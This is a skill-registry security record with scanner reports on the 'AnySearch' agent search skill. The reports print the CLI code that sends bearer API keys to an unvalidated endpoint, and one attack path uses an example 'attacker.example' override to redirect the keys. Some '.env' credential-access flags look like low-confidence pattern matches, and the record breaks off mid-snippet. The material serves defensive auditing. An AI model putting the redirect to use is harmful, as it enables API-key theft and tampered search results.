{"schema":"clawhub.skill.verify.v1","ok":false,"decision":"fail","reasons":["security.status_not_clean"],"slug":"anysearch","displayName":"AnySearch","pageUrl":"https://clawhub.ai/anysearch-ai/skills/anysearch","publisherHandle":"anysearch-ai","publisherDisplayName":"AnySearch","publisherProfileUrl":"https://clawhub.ai/anysearch-ai","version":"3.1.1","resolvedFrom":"version","tag":null,"createdAt":1788339309738,"card":{"available":true,"path":"skill-card.md","url":"https://wry-manatee-359.convex.site/api/v1/skills/anysearch/card?ownerHandle=anysearch-ai&version=3.1.1","sha256":"1dc2af73d3e27729874fc8d6e4f184d0a790b347b867eef74d8431a1bea44c4b","size":2228,"contentType":"text/markdown; charset=utf-8"},"artifact":{"sourceFingerprint":"24a5c9497a1dcc8abe9cc1e999bbba7e7d017976af71e6290ac579a0033f26f1","bundleFingerprints":["639de5f7164d26cf2b68271c9482f22ab22079f98726a4253ffe68771ad60524","158b768b0a66760b8b1e346cd070ce4cadb7fa8f78f64eb0e223f787b3ccdef4"],"files":[{"path":".env.example","size":375,"sha256":"38ba2a57290ff77882cb28ce5496722d86c0eb4e5176628bc280eb798d4ffbca","contentType":"application/octet-stream"},{"path":".gitattributes","size":17,"sha256":"1d5d71dcc6ccd28ab46a335349ecc74742ca4b81f4fcad212f8d134f70f1f13e","contentType":"text/plain"},{"path":".gitignore","size":35,"sha256":"c46c6f288d3ec1733bd66ec8f2649cde63acef481c92c5f7e6926b4f0186a462","contentType":"text/plain"},{"path":"LICENSE","size":11215,"sha256":"07a854e52ab475b19ac2bed1bb1e014da7be2e9613aa27a86808f07dba531d94","contentType":"application/octet-stream"},{"path":"NOTICE","size":90,"sha256":"5eab122dbb6c1198640222c32c15e57cee925c884619edfb133b3f210b24c9b2","contentType":"application/octet-stream"},{"path":"README.md","size":11547,"sha256":"a090f413a5c48dfbb03364862439e08aa8506d069ccf57f2b45e98faef4a2602","contentType":"text/markdown"},{"path":"README_zh.md","size":11507,"sha256":"eecb62f19a1a7dfe5c64780f2b1849d9df4bdf5950d9e864774c827e27976c69","contentType":"text/markdown"},{"path":"requirements.txt","size":183,"sha256":"e6f639fef7f09e79c31bb68bf232e83a09e832c8fc9e1d1818514ca9b20d4713","contentType":"text/plain"},{"path":"SECURITY.md","size":1222,"sha256":"37bb52a2b58e86b950bce1bc905d454ca977c166094d9da9edfd8c7b58bb150a","contentType":"text/markdown"},{"path":"SHA256SUMS.txt","size":365,"sha256":"8d24f50e4a929a93ec20d3ea612aa43c75ce0801799021b2c8b244700a7d3465","contentType":"text/plain"},{"path":"SKILL.md","size":12647,"sha256":"54702f6066dc76cb2b3c04ba556404e6113b1cdcf0f63120ef3306343f9ab25e","contentType":"text/markdown"},{"path":"scripts/anysearch_cli.js","size":21113,"sha256":"c11c32aecbe3e330385850fbf88696a4188dc23b0dadbeb3f7a9297b57f23e5c","contentType":"text/javascript"},{"path":"scripts/anysearch_cli.ps1","size":29722,"sha256":"7c8cfcdb174ccd988970c739d51b93b1450a5adb496109a63c0f177153f7d2a1","contentType":"application/octet-stream"},{"path":"scripts/anysearch_cli.py","size":27646,"sha256":"4045623cc09f3289a17ddb83dd91c0039bb85d37eb809ebaa4e8dd8777ebcaae","contentType":"text/x-python"},{"path":"scripts/anysearch_cli.sh","size":22070,"sha256":"7f1002271640d97f14b1bdd317b55ddcc20dfa0bcd21f3a276f05764c2337e33","contentType":"text/x-sh"},{"path":"scripts/generate.py","size":9568,"sha256":"8313494e60b6c3ff55d93cf0d2cbe49da5d63df02c158657d4df95b9eee628ac","contentType":"text/x-python"},{"path":"scripts/test_cli.py","size":12916,"sha256":"93e9112dd80d34d136e9f92e23f0c8e7525da03490d9a3481ef2c5e8f8cfc51a","contentType":"text/x-python"},{"path":"scripts/shared/constants.json","size":278,"sha256":"8464aa5b51181ff76438c9275852e73d29216471d1b91d94682a270305869d20","contentType":"application/json"},{"path":"scripts/shared/doc_spec.md","size":10292,"sha256":"3fe372d6d5efd02324c073500d904b2209943ba5be9ee7e077cb1efeb9532f85","contentType":"text/markdown"}]},"provenance":{"source":"unavailable","reason":"No server-resolved GitHub import provenance is stored for this version."},"security":{"status":"suspicious","passed":false,"rawStatus":"suspicious","verdict":"suspicious","confidence":"high","summary":"This appears to be a real search skill, but its clients can be redirected to send API keys and queries to an unexpected endpoint.","model":null,"checkedAt":1789544021723,"scannerReports":{"aig":{"version":"2.1.0","$schema":"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/Schemata/sarif-schema-2.1.0.json","runs":[{"tool":{"driver":{"name":"aig-skill-scan","version":"0.2.1","informationUri":"https://github.com/Tencent/AI-Infra-Guard","rules":[{"id":"T01","name":"Skill Instruction Hijacking","shortDescription":{"text":"Alters the agent's current session goals or safety constraints when the skill is loaded"}},{"id":"T02","name":"Agent Memory Poisoning","shortDescription":{"text":"Writes attacker-controlled rules into persistent memory so they continue to affect future sessions"}},{"id":"T03","name":"Remote Payload Retrieval and Execution","shortDescription":{"text":"Fetches code from an external URL, allowing the effective payload to change after skill review"}},{"id":"T04","name":"Embedded Malicious Code","shortDescription":{"text":"Ships malicious scripts inside the skill package and executes them locally when invoked"}},{"id":"T05","name":"Unauthorized Access and Privilege Escalation","shortDescription":{"text":"Breaks least-privilege boundaries by obtaining permissions beyond the task's legitimate needs"}},{"id":"T06","name":"System Persistence","shortDescription":{"text":"Installs cross-session backdoors, hooks, services, or scheduled tasks that survive the skill run"}},{"id":"T07","name":"Tool Hijacking and Spoofing","shortDescription":{"text":"Modifies, wraps, spoofs, or replaces tools so legitimate-looking calls execute attacker logic"}},{"id":"T08","name":"Insecure Dependencies","shortDescription":{"text":"Introduces malicious packages or components through dependency confusion, typosquatting, or unsafe sources"}},{"id":"T09","name":"Insecure Skill Coding Practices","shortDescription":{"text":"Exposes exploitable flaws such as hardcoded secrets, command injection, plaintext sensitive data, or unsafe temp files"}},{"id":"other","name":"Other Risk","shortDescription":{"text":"Security issues not covered by the T01-T09 classification"}}]}},"results":[{"ruleId":"T09","level":"error","message":{"text":"Bearer credentials and sensitive requests can be redirected to an arbitrary endpoint"},"locations":[{"physicalLocation":{"artifactLocation":{"uri":"scripts/anysearch_cli.py"},"region":{"startLine":50,"endLine":84}}}],"partialFingerprints":{"primaryLocationLineHash":"096359e4b6597e25"},"properties":{"description":"<![CDATA[\n## Vulnerability Details\n\n**File Location**: `scripts/anysearch_cli.py:50-84`  \n**Additional Affected Files**: `scripts/anysearch_cli.js:13,56-77`; `scripts/anysearch_cli.ps1:43,53-61,89`; `scripts/anysearch_cli.sh:131-147`; `scripts/generate.py:72,82,92,103`  \n**Vulnerability Type**: Unrestricted API endpoint override with credential forwarding  \n**Risk Level**: High\n\n### Complete Vulnerable Code Snippet\n\n```python\nAPI_BASE_URL = os.environ.get(\n    \"ANYSEARCH_API_BASE_URL\",\n    \"https://api.anysearch.com\"\n).rstrip(\"/\")\n\ndef _build_headers(api_key: str) -> dict:\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Anysearch-Client\": CLIENT_HEADER,\n    }\n    if api_key:\n        headers[\"Authorization\"] = f\"Bearer {api_key}\"\n    return headers\n\ndef _call_rest(method: str, path: str, api_key: str, *, payload=None, params=None) -> dict:\n    try:\n        resp = requests.request(\n            method,\n            f\"{API_BASE_URL}{path}\",\n            json=payload,\n            params=params,\n            headers=_build_headers(api_key),\n            timeout=30,\n        )\n```\n\nThe Node.js implementation additionally demonstrates that plaintext HTTP is explicitly supported:\n\n```javascript\nconst API_BASE_URL = (process.env.ANYSEARCH_API_BASE_URL ||\n  \"https://api.anysearch.com\").replace(/\\/$/, \"\");\n\nfunction restRequest(method, endpointPath, apikey, payload = undefined, params = []) {\n  const urlObj = new URL(API_BASE_URL + endpointPath);\n\n  const options = {\n    hostname: urlObj.hostname,\n    port: urlObj.port || undefined,\n    path: urlObj.pathname + urlObj.search,\n    method,\n    headers: {\n      \"Content-Type\": \"application/json\",\n      \"X-Anysearch-Client\": CLIENT_HEADER,\n    },\n  };\n\n  if (apikey) {\n    options.headers[\"Authorization\"] = `Bearer ${apikey}`;\n  }\n\n  return new Promise((resolve, reject) => {\n    const transport = urlObj.protocol === \"http:\" ? http : https;\n    const req = transport.request(options, (res) => {\n```\n\nThe shell implementation has the same behavior:\n\n```bash\nAPI_BASE_URL=\"${ANYSEARCH_API_BASE_URL:-https://api.anysearch.com}\"\nAPI_BASE_URL=\"${API_BASE_URL%/}\"\n\n_curl_rest() {\n  local method=\"$1\"\n  local url=\"$2\"\n  local payload=\"${3:-}\"\n  local auth_args=()\n\n  if [[ -n \"$API_KEY\" ]]; then\n    auth_args+=(-H \"Authorization: Bearer $API_KEY\")\n  fi\n\n  curl -s -w '\\n%{http_code}' -X \"$method\" \"$url\" \\\n```\n\n### Technical Analysis\n\nThe clients obtain their destination from the externally controlled `ANYSEARCH_API_BASE_URL` environment variable. No implementation validates that:\n\n1. The scheme is HTTPS.\n2. The destination host is `api.anysearch.com`.\n3. Credentials are only attached to the intended API origin.\n4. The endpoint override is limited to test or development mode.\n\nThe clients then unconditionally attach `Authorization: Bearer <API_KEY>` whenever an API key is available. The Python, Node.js, PowerShell, and Bash implementations all exhibit this behavior. The Node.js and Bash clients can send requests over plaintext HTTP, exposing credentials and request contents to passive or active network interception.\n\nThe clients also load values from Skill-local `.env` files. Because the loaders are not restricted to `ANYSEARCH_API_KEY`, a modified `.env` can define `ANYSEARCH_API_BASE_URL` and redirect subsequent requests.\n\nEndpoint configurability is useful for local testing, as demonstrated by `scripts/test_cli.py`, but permitting it in production without origin validation exceeds the minimum privileges needed for a client documented as sending credentials and queries specifically to `https://api.anysearch.com`.\n\n### Attack Path\n\n1. An attacker gains the ability to influence the process environment or a Skill-local `.env` file.\n2. The attacker sets an endpoint such as:\n   ```env\n   ANYSEARCH_API_BASE_URL=http://attacker.example\n   ```\n3. The user or agent invokes a normal search, batch search, sub-domain lookup, or extraction request.\n4. The client reads the legitimate API key from `.env`, the environment, or `--api_key`.\n5. The client sends the following to the attacker-controlled endpoint:\n   - `Authorization: Bearer <API_KEY>`\n   - Search queries and vertical-search parameters\n   - URLs submitted for content extraction\n   - Client metadata\n6. The attacker records the bearer credential and sensitive inputs.\n7. The attacker may return fabricated API responses, causing manipulated search or extraction content to be presented to the agent.\n8. The stolen API key can subsequently be used against the legitimate AnySearch service until it is revoked or expires.\n\n### Impact Assessment\n\nSuccessful exploitation can provide the attacker with:\n\n- The victim's AnySearch bearer API key.\n- Access to the quota and service privileges associated with that key.\n- Search queries, extracted URLs, and associated parameters.\n- The ability to manipulate search results returned to the agent.\n- A channel for supplying attacker-controlled external content that could influence downstream agent behavior.\n\nThe vulnerability does not directly grant operating-system privilege escalation. Its scope is credential theft, service-account abuse, privacy loss, and compromise of search-result integrity. If plaintext HTTP is selected, local network attackers may obtain the same information without controlling the endpoint host.\n]]>","severity":"High"},"fixes":[{"description":{"text":"<![CDATA[\n## Remediation Suggestions\n\n1. **Remove the production endpoint override where possible.** Hardcode `https://api.anysearch.com` in distributable clients and inject test endpoints directly into internal test functions.\n\n2. **Enforce HTTPS and an explicit host allowlist.** Validate the parsed URL before constructing any request:\n   ```python\n   from urllib.parse import urlparse\n\n   parsed = urlparse(API_BASE_URL)\n   if parsed.scheme != \"https\" or parsed.hostname != \"api.anysearch.com\":\n       raise RuntimeError(\"Untrusted AnySearch API endpoint\")\n   ```\n\n3. **Bind credentials to the intended origin.** Add the `Authorization` header only when the final request origin exactly matches the approved HTTPS origin.\n\n4. **Control redirects.** Disable redirects where unnecessary. If redirects are supported, reject cross-origin redirects and never forward authorization headers to a different host or scheme.\n\n5. **Restrict `.env` parsing.** Only import explicitly supported keys:\n   ```python\n   if key == \"ANYSEARCH_API_KEY\" and value:\n       os.environ[key] = value\n   ```\n   Do not treat Skill-local `.env` files as a general-purpose source of arbitrary process-environment assignments.\n\n6. **Separate test configuration from production configuration.** For example, permit a custom endpoint only when an explicit test-mode flag is enabled and refuse to attach real credentials in that mode.\n\n7. **Apply the correction consistently.** Update all four clients and `scripts/generate.py` so regeneration does not restore the vulnerable behavior.\n\n8. **Add regression tests** confirming that HTTP URLs, non-AnySearch hosts, user-info URLs, malformed origins, and cross-origin redirects are rejected before credentials are transmitted.\n]]>"}}]},{"ruleId":"T08","level":"note","message":{"text":"Python dependency installation is not reproducible or integrity-pinned"},"locations":[{"physicalLocation":{"artifactLocation":{"uri":"requirements.txt"},"region":{"startLine":1,"endLine":4}}}],"partialFingerprints":{"primaryLocationLineHash":"48b89ac7cbb7c902"},"properties":{"description":"<![CDATA[\n## Vulnerability Details\n\n**File Location**: `requirements.txt:1-4`  \n**Additional Affected Location**: `SKILL.md:158`  \n**Vulnerability Type**: Unbounded third-party dependency resolution  \n**Risk Level**: Low\n\n### Complete Vulnerable Code Snippet\n\n```text\n# Dependency for the Python CLI (scripts/anysearch_cli.py).\n# The Node.js, Bash and PowerShell CLIs require nothing from this file.\n#   pip install -r requirements.txt\nrequests>=2.20\n```\n\nThe Skill instructions also recommend installing the dependency dynamically:\n\n```markdown\n- Dependency: the `requests` library (not part of the standard library). It is\n  commonly already available; if importing it fails, install with\n  `pip install requests` (or `pip install -r requirements.txt`), or fall\n  through to the Node.js CLI, which has no dependencies.\n```\n\n### Technical Analysis\n\nThe Python dependency is specified only with a broad lower bound:\n\n```text\nrequests>=2.20\n```\n\nThere is no exact version, upper compatibility bound, lock file, or package hash. Consequently, installation results depend on the state of the package index at installation time rather than on the audited project contents.\n\nThe direct package name is legitimate and no typosquatting or dependency-confusion package was identified. Nevertheless, the current instructions permit an agent to install unaudited future versions and their transitive dependencies. Python package installation can execute build backend and installation-related code with the permissions of the invoking user.\n\nThis is a supply-chain hardening deficiency rather than evidence that the current `requests` package is malicious.\n\n### Attack Path\n\n1. The selected Python runtime does not already contain `requests`.\n2. The agent follows `SKILL.md:158` and executes:\n   ```bash\n   pip install requests\n   ```\n   or:\n   ```bash\n   pip install -r requirements.txt\n   ```\n3. pip resolves the latest version satisfying `requests>=2.20`, together with dynamically selected transitive dependencies.\n4. A future compromised, malicious, or incompatible release can be selected without any change to the audited repository.\n5. Installation or subsequent import executes that dependency with the user's process privileges.\n\nExploitation therefore depends on compromise of the package distribution channel, a dependency release, package-index configuration, or a malicious mirror. The repository itself does not contain evidence that such a compromise has already occurred.\n\n### Impact Assessment\n\nIf dependency resolution is compromised, malicious installation or import behavior could run with the privileges of the user executing pip or the Skill. Potential consequences include:\n\n- Reading files accessible to that user.\n- Accessing environment variables and locally stored credentials.\n- Modifying user-writable files.\n- Initiating network connections.\n- Compromising the confidentiality and integrity of subsequent Skill operations.\n\nThe practical severity is reduced because dependency installation is conditional, the package name is established, and dependency-free runtime alternatives are provided.\n]]>","severity":"Low"},"fixes":[{"description":{"text":"<![CDATA[\n## Remediation Suggestions\n\n1. Pin a reviewed version or use a narrowly bounded compatible range rather than an unrestricted lower bound.\n\n2. Generate a lock or constraints file containing all transitive dependencies and reviewed versions.\n\n3. Require package hashes, for example through pip's `--require-hashes` mode:\n   ```text\n   requests==<reviewed-version> --hash=sha256:<reviewed-hash>\n   ```\n\n4. Document a controlled update process that reviews new direct and transitive dependency versions before changing the lock file.\n\n5. Prefer an already available dependency-free runtime, such as the bundled Node.js client, instead of instructing an agent to install packages automatically.\n\n6. If installation is necessary, require user confirmation and use an isolated virtual environment rather than modifying the global Python environment.\n\n7. Add automated dependency vulnerability and integrity checks to release CI.\n]]>"}}]}],"properties":{"securityScore":50,"primaryLanguage":"Markdown","llm":"gpt-5.6","startTime":1789543825.3673053,"endTime":1789543960.8058631}}]},"skillspector":{"skill":{"name":"anysearch","source":"/tmp/clawhub-codex-scan-v572xtsqwn91ah216264esc0yd8egpy0-ELqnpg/clawscan-skillspector-1121435983/artifact","scanned_at":"2026-09-16T07:30:10.393197+00:00"},"risk_assessment":{"score":100,"severity":"CRITICAL","recommendation":"DO_NOT_INSTALL","max_issue_severity":"HIGH"},"components":[{"path":".env.example","type":"other","lines":11,"executable":false,"size_bytes":375,"source_url":null,"source_identity":null,"source_digest":null},{"path":".gitattributes","type":"other","lines":1,"executable":false,"size_bytes":17,"source_url":null,"source_identity":null,"source_digest":null},{"path":".gitignore","type":"other","lines":4,"executable":false,"size_bytes":35,"source_url":null,"source_identity":null,"source_digest":null},{"path":"LICENSE","type":"other","lines":200,"executable":false,"size_bytes":11215,"source_url":null,"source_identity":null,"source_digest":null},{"path":"NOTICE","type":"other","lines":4,"executable":false,"size_bytes":90,"source_url":null,"source_identity":null,"source_digest":null},{"path":"README.md","type":"markdown","lines":268,"executable":false,"size_bytes":11547,"source_url":null,"source_identity":null,"source_digest":null},{"path":"README_zh.md","type":"markdown","lines":268,"executable":false,"size_bytes":11507,"source_url":null,"source_identity":null,"source_digest":null},{"path":"SECURITY.md","type":"markdown","lines":50,"executable":false,"size_bytes":1222,"source_url":null,"source_identity":null,"source_digest":null},{"path":"SHA256SUMS.txt","type":"text","lines":4,"executable":false,"size_bytes":365,"source_url":null,"source_identity":null,"source_digest":null},{"path":"SKILL.md","type":"markdown","lines":193,"executable":false,"size_bytes":12647,"source_url":null,"source_identity":null,"source_digest":null},{"path":"requirements.txt","type":"text","lines":4,"executable":false,"size_bytes":183,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/anysearch_cli.js","type":"javascript","lines":587,"executable":true,"size_bytes":21113,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/anysearch_cli.ps1","type":"other","lines":769,"executable":true,"size_bytes":29722,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/anysearch_cli.py","type":"python","lines":723,"executable":true,"size_bytes":27646,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/anysearch_cli.sh","type":"shell","lines":610,"executable":true,"size_bytes":22070,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/generate.py","type":"python","lines":243,"executable":true,"size_bytes":9568,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/shared/constants.json","type":"json","lines":8,"executable":false,"size_bytes":278,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/shared/doc_spec.md","type":"markdown","lines":237,"executable":false,"size_bytes":10292,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/test_cli.py","type":"python","lines":333,"executable":true,"size_bytes":12916,"source_url":null,"source_identity":null,"source_digest":null}],"structured_summaries":[],"issues":[{"id":"PE3","finding_id":"finding-5333920380a2423a9e2cd18809a4f844","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.6,"location":{"file":".env.example","start_line":6,"end_line":null},"finding":".env\n","explanation":"Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.","remediation":"Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.","code_snippet":".env\nruntime.conf\n__pycache__\n.idea","intent":null,"tags":["Privilege Escalation"],"evidence":{},"match_fingerprint":"66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf","occurrences":[{"file":".env.example","start_line":6,"end_line":null}]},{"id":"PE3","finding_id":"finding-5333920380a2423a9e2cd18809a4f844","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.6,"location":{"file":".gitignore","start_line":1,"end_line":null},"finding":".env\n","explanation":"Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.","remediation":"Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.","code_snippet":".env\nruntime.conf\n__pycache__\n.idea","intent":null,"tags":["Privilege Escalation"],"evidence":{},"match_fingerprint":"66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf","occurrences":[{"file":".gitignore","start_line":1,"end_line":null}]},{"id":"PE3","finding_id":"finding-85d2ae99b5db4e33a65419bd348c6bfc","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.6,"location":{"file":"README.md","start_line":109,"end_line":null},"finding":".env\n","explanation":"Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.","remediation":"Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.","code_snippet":"Copy the example env file and fill in your key:\n\n```bash\ncp .env.example .env\n# Edit .env and set: ANYSEARCH_API_KEY=<your_api_key_here>\n```\n","intent":null,"tags":["Privilege Escalation","contextual-triage","likely-benign-context","llm-unconfirmed"],"evidence":{},"match_fingerprint":"66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf","occurrences":[{"file":"README.md","start_line":109,"end_line":null}]},{"id":"PE3","finding_id":"finding-38bce509d29e474dafbe210ae38829a5","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.9,"location":{"file":"README_zh.md","start_line":109,"end_line":null},"finding":".env\n","explanation":"The documentation instructs storing an API key in a plaintext .env file. Although common, this increases the chance of accidental exposure through local file access, backups, logs, or misconfigured tooling, especially in shared agent environments.","remediation":"Prefer OS or platform secret stores, credential managers, or injected environment variables from a secure configuration system. If .env support remains, warn that it is plaintext, ensure strict file permissions, and discourage use on shared systems.","code_snippet":"复制示例环境变量文件并填入你的 key：\n\n```bash\ncp .env.example .env\n# 编辑 .env 并设置：ANYSEARCH_API_KEY=<your_api_key_here>\n```\n","intent":null,"tags":["Privilege Escalation","contextual-triage","likely-benign-context"],"evidence":{},"match_fingerprint":"66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf","occurrences":[{"file":"README_zh.md","start_line":109,"end_line":null}]},{"id":"TP4","finding_id":"finding-f88f5998f209494b9ed49836008ab7b4","category":"MCP Tool Poisoning","pattern":null,"severity":"HIGH","confidence":0.99,"location":{"file":"SKILL.md","start_line":1,"end_line":null},"finding":null,"explanation":"If the skill package also contains local test-server and multi-runtime subprocess test functionality, that materially exceeds the declared end-user search purpose. In environments where skills are trusted based on description, hidden testing/subprocess behavior expands attack surface and may enable unexpected local execution paths, network listeners, or command invocation.","remediation":"Remove test harnesses and local server/subprocess validation logic from the production skill package, or publish them as separate development artifacts. Ensure the skill manifest accurately declares all behaviors and restrict runtime invocation to the search/extract commands needed for normal operation.","code_snippet":null,"intent":null,"tags":["ASI02","AML.T0080"],"evidence":{"code_path":"scripts/generate.py","code_start_line":1,"code_end_line":243,"actual_behavior_summary":"A build/code-generation utility that reads SKILL.md and shared configuration files, then regenerates CLI script sections for Python, JavaScript, PowerShell, and Bash, with an optional CI check mode."},"match_fingerprint":null,"occurrences":[{"file":"SKILL.md","start_line":1,"end_line":null}]},{"id":"TP4","finding_id":"finding-bee3e4785a684ca5ba4669e0293e2108","category":"MCP Tool Poisoning","pattern":null,"severity":"HIGH","confidence":0.98,"location":{"file":"SKILL.md","start_line":1,"end_line":null},"finding":null,"explanation":"If the skill package also contains local test-server and multi-runtime subprocess test functionality, that materially exceeds the declared end-user search purpose. In environments where skills are trusted based on description, hidden testing/subprocess behavior expands attack surface and may enable unexpected local execution paths, network listeners, or command invocation.","remediation":"Remove test harnesses and local server/subprocess validation logic from the production skill package, or publish them as separate development artifacts. Ensure the skill manifest accurately declares all behaviors and restrict runtime invocation to the search/extract commands needed for normal operation.","code_snippet":null,"intent":null,"tags":["ASI02","AML.T0080"],"evidence":{"code_path":"scripts/test_cli.py","code_start_line":1,"code_end_line":333,"actual_behavior_summary":"This code is a cross-runtime test harness that launches a local HTTP stub server and validates CLI clients for search, sub-domain lookup, extract, and batch-search behavior, including request formatting, headers, concurrency, and error handling."},"match_fingerprint":null,"occurrences":[{"file":"SKILL.md","start_line":1,"end_line":null}]},{"id":"PE3","finding_id":"finding-c1ead3bc079440a6a9a8529644979526","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.91,"location":{"file":"SKILL.md","start_line":11,"end_line":null},"finding":".env ","explanation":"The skill explicitly handles an API key from .env, environment variables, or CLI flags, which confirms credential access capability. This is risky in a skill that also performs network operations and shell invocation, because mishandling could expose secrets via process arguments, logs, error messages, or unintended downstream requests.","remediation":"Avoid accepting secrets via CLI flags where they may be exposed in process listings or shell history; prefer secure environment injection or secret storage APIs. Declare credential handling explicitly in permissions metadata, redact secrets from logs/errors, and enforce that keys are never echoed, embedded in URLs, or passed to untrusted extracted content.","code_snippet":"  - name: ANYSEARCH_API_KEY\n    required: false\n    description: \"API key for higher rate limits. Anonymous access available with lower rate limits.\"\n    storage: \".env file, environment variable, or --api_key CLI flag\"\n---\n\n## Overview","intent":null,"tags":["Privilege Escalation"],"evidence":{},"match_fingerprint":"66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf","occurrences":[{"file":"SKILL.md","start_line":11,"end_line":null}]},{"id":"PE3","finding_id":"finding-7bdfcefca39b4156872ef4ba3f6f05d7","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.94,"location":{"file":"SKILL.md","start_line":94,"end_line":null},"finding":".env ","explanation":"The documented key source priority explicitly prefers a CLI flag over .env and environment variables, which is a poor security default because command-line arguments are often visible to other local users, shell history, monitoring agents, and crash reports. The skill context makes this more dangerous because the tool is designed for routine use and could normalize insecure secret-passing practices.","remediation":"Change key source priority to prefer secure environment variables or a secret manager over CLI flags, and discourage command-line secret entry except for controlled debugging. Update documentation to warn that --api_key may leak through shell history and process inspection, and support reading from stdin or a protected config store if interactive entry is needed.","code_snippet":"### Key Source Priority\n\n```\n--api_key CLI flag  >  .env file (ANYSEARCH_API_KEY)  >  system environment variable  >  anonymous access\n```\n\n**Anonymous access is available** with lower rate limits. An API Key is optional but recommended for higher rate limits. If no key is found, the agent may proceed with anonymous access. If the user wants higher limits, guide them to configure a key securely.","intent":null,"tags":["Privilege Escalation"],"evidence":{},"match_fingerprint":"66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf","occurrences":[{"file":"SKILL.md","start_line":94,"end_line":null}]},{"id":"PE3","finding_id":"finding-848ca0a309064cd6a3f12d6b9a83636f","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.88,"location":{"file":"SKILL.md","start_line":129,"end_line":null},"finding":".env ","explanation":"The skill instructs the agent to persist a newly received API key into a local .env file after user confirmation. Even with confirmation, automatic secret persistence expands the blast radius of compromise because .env files may have weak filesystem protections, be accidentally committed to source control, or be readable by other local tools and sessions.","remediation":"Do not have the agent write API keys directly to project-local .env files by default. Instead, prompt the user to store the key in a platform secret store or manually configure it, and if local file storage is supported, require explicit path selection, set restrictive permissions, and warn about git-ignore and secret exposure risks.","code_snippet":"\nWhen a new key is obtained via auto-registration, the agent MUST:\n1. Ask the user for explicit confirmation before saving the key to disk.\n2. Inform the user: \"A new API key was received. Save it to .env for future use?\"\n3. Only after user approval, update the `.env` file.\n4. Inform the user where the key is stored and that it will be reused in future sessions.\n","intent":null,"tags":["Privilege Escalation"],"evidence":{},"match_fingerprint":"66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf","occurrences":[{"file":"SKILL.md","start_line":129,"end_line":null}]},{"id":"AE1","finding_id":"finding-e28eeb31f1044faaad3c53c3e4b693ed","category":"analysis-evasion","pattern":null,"severity":"HIGH","confidence":1,"location":{"file":"SKILL.md","start_line":172,"end_line":null},"finding":"scripts/anysearch_cli.sh (partial)","explanation":"Referenced artifact was not completely inspected","remediation":"Make the referenced artifact locally available and fully analyzable, or remove the reference.","code_snippet":"| Linux / macOS | bash 3.2+ (with `jq` and `curl`) | `anysearch_cli.sh` |","intent":null,"tags":["coverage","reference","target-disposition:partial"],"evidence":{},"match_fingerprint":"ff42aa7db5b9256bdfee14162181d84c16ff1c7d1c71602554db4b5c0a68b823","occurrences":[{"file":"SKILL.md","start_line":172,"end_line":null}]},{"id":"AE1","finding_id":"finding-e28eeb31f1044faaad3c53c3e4b693ed","category":"analysis-evasion","pattern":null,"severity":"HIGH","confidence":1,"location":{"file":"SKILL.md","start_line":177,"end_line":null},"finding":"scripts/anysearch_cli.sh (partial)","explanation":"Referenced artifact was not completely inspected","remediation":"Make the referenced artifact locally available and fully analyzable, or remove the reference.","code_snippet":"| Linux / macOS | bash 3.2+ (with `jq` and `curl`) | `anysearch_cli.sh` |","intent":null,"tags":["coverage","reference","target-disposition:partial"],"evidence":{},"match_fingerprint":"ff42aa7db5b9256bdfee14162181d84c16ff1c7d1c71602554db4b5c0a68b823","occurrences":[{"file":"SKILL.md","start_line":177,"end_line":null}]},{"id":"PE3","finding_id":"finding-6ae31f224e2149da8f61768f87fc6cff","category":"Privilege Escalation","pattern":"Credential Access","severity":"HIGH","confidence":0.6,"location":{"file":"scripts/anysearch_cli.js","start_line":22,"end_line":null},"finding":".env\"","explanation":"Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.","remediation":"Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.","code_snippet":"$SCRIPT_DIR = Split-Path -Parent $MyInvocation.MyCommand.Definition\n\nfunction Load-Env {\n    $envPaths = @((Join-Path $SCRIPT_DIR \".env\"), (Join-Path (Join-Path $SCRIPT_DIR \"..\") \".env\"))\n    foreach ($envPath in $envPaths) {\n        if (Test-Path $envPath) {\n            Get-Content $envPath -Encoding UTF8 